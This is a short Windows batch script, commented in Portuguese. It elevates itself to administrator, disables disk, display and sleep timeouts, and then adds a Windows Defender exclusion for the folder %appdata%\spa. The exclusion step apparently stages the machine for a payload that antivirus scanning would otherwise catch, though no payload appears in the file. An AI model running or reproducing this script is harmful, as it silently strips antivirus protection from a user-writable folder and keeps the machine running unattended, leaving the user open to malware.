@echo off
:: Verifica se o script já está rodando como administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

:: Configuração de energia
powercfg /s SCHEME_BALANCED
powercfg /change disk-timeout-ac 0
powercfg /change disk-timeout-dc 0
powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_DISK DISKIDLE 0
powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_DISK DISKIDLE 0
powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_VIDEO VIDEOIDLE 0
powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_VIDEO VIDEOIDLE 0
powercfg -SETACVALUEINDEX SCHEME_BALANCED SUB_SLEEP STANDBYIDLE 0
powercfg -SETDCVALUEINDEX SCHEME_BALANCED SUB_SLEEP STANDBYIDLE 0
powercfg /apply >nul 2>&1

:: Adiciona exceção no Windows Defender
powershell -Command "try { Add-MpPreference -ExclusionPath '%appdata%\spa' } catch { echo 'Erro ao adicionar exceção no antivirus' }"

exit
